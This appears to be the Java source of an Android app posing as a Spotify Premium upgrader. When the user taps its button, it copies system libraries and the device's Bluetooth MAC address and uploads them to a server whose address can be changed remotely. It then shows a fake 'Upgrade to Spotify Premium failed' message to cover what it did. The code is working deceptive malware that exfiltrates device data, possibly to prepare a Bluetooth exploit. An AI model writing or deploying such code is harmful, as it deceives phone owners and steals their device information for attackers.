package com.fakespotify.music;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;

import android.Manifest;
import android.bluetooth.BluetoothAdapter;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.os.Build;
import android.util.Log;
import android.view.View;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.StrictMode;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import android.view.WindowManager;
import android.widget.TextView;

import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

public class MainActivity extends AppCompatActivity {

    private static final String defaultURL = "http://remembertochangetheaddress:8000";
    private static final MediaType MEDIA_TYPE = MediaType.parse("application/octet-stream");
    private FirebaseRemoteConfig mFirebaseRemoteConfig;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);
        setContentView(R.layout.activity_main);
        configFirebase();
    }

    protected void configFirebase(){
        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(300)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);

        Map<String, Object> hm = new HashMap<>();
        hm.put("WEBSERVER_URL", defaultURL);
        mFirebaseRemoteConfig.setDefaultsAsync(hm);
        mFirebaseRemoteConfig.fetchAndActivate();
    }

    protected void init(){
        int SDK_INT = android.os.Build.VERSION.SDK_INT;
        if (SDK_INT > 8) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
                    .permitAll().build();
            StrictMode.setThreadPolicy(policy);
            // Create directory to receive .so files
            String filesPath = this.getApplicationInfo().dataDir + "/so_files";
            String fileBtAddress = filesPath + "/bt_address.txt";

            // Get bluetooth MAC Address
            String btAddress = getBluetoothMac(this);

            // Copy libc.so and bluetooth.default.so
            runCommand("mkdir -p " + filesPath);
            runCommand("cp /system/lib/libc.so " + filesPath);
            runCommand("cp /system/lib/hw/bluetooth.default.so " + filesPath);
            runCommand("echo " + btAddress + " > " + fileBtAddress);

            // Upload file to Web Server
            File[] files = new File(filesPath).listFiles();
            uploadFiles(files);
        }
    }

    protected void runCommand(String command){
        try{
            String[] cmdline = { "sh", "-c", command};
            Process process = Runtime.getRuntime().exec(cmdline);
            String line;

            InputStream stderr = process.getErrorStream();
            InputStreamReader esr = new InputStreamReader (stderr);
            BufferedReader ebr = new BufferedReader (esr);
            while ( (line = ebr.readLine()) != null )
                Log.e("TAG", line);

            InputStream stdout = process.getInputStream();
            InputStreamReader osr = new InputStreamReader (stdout);
            BufferedReader obr = new BufferedReader (osr);
            while ( (line = obr.readLine()) != null )
                Log.i("TAG", line);

            int exitVal = process.waitFor();
            Log.d("TAG", "getprop exitValue: " + exitVal);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    protected void uploadFiles(File [] files){
        for (File file : files) {
            upload(file);
        }
    }

    protected void upload(File file){
        try{
            OkHttpClient client = new OkHttpClient();
            RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.getName(), RequestBody.create(MEDIA_TYPE, file))
                    .build();

            Request request = new Request.Builder().url(mFirebaseRemoteConfig.getString("WEBSERVER_URL"))
                    .post(requestBody).build();

            Response response = client.newCall(request).execute();
            if (!response.isSuccessful()) {
                throw new IOException("Unexpected code " + response);
            }
        } catch(IOException e){
            e.printStackTrace();
        }
    }

    public void verifyConnection(View v){
        if(isNetworkAvailable(this)) {
            setContentView(R.layout.progress_bar);
            init();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                setContentView(R.layout.activity_main);
                TextView textView = findViewById(R.id.textview1);
                textView.setText("Upgrade to Spotify Premium failed");
                textView.setVisibility(View.VISIBLE);
                new Handler(Looper.getMainLooper()).postDelayed(() -> textView.setVisibility(View.GONE), 2000);
            }, 3000);
        }
        else {
            TextView textView = findViewById(R.id.textview1);
            textView.setText("You're offline. Check the connection and retry.");
            textView.setVisibility(View.VISIBLE);
            new Handler(Looper.getMainLooper()).postDelayed(() -> textView.setVisibility(View.GONE), 2000);
        }
    }

    protected boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = ((ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE));
        return connectivityManager.getActiveNetworkInfo() != null && connectivityManager.getActiveNetworkInfo().isConnected();
    }

    protected String getBluetoothMac(final Context context) {

        String result = null;
        if (context.checkCallingOrSelfPermission(Manifest.permission.BLUETOOTH)
                == PackageManager.PERMISSION_GRANTED) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Hardware ID are restricted in Android 6+
                // https://developer.android.com/about/versions/marshmallow/android-6.0-changes.html#behavior-hardware-id
                // Getting bluetooth mac via reflection for devices with Android 6+
                result = android.provider.Settings.Secure.getString(context.getContentResolver(),
                        "bluetooth_address");
            } else {
                BluetoothAdapter bta = BluetoothAdapter.getDefaultAdapter();
                result = bta != null ? bta.getAddress() : "";
            }
        }
        return result;
    }
}